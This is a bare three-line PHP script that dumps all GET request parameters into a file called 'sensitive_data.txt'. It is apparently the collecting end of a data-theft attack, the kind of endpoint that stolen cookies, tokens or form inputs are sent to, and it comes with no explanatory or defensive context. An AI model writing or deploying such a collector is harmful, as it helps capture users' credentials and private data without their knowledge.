<?php
$content = print_r($_GET, true);
file_put_contents('sensitive_data.txt',$content);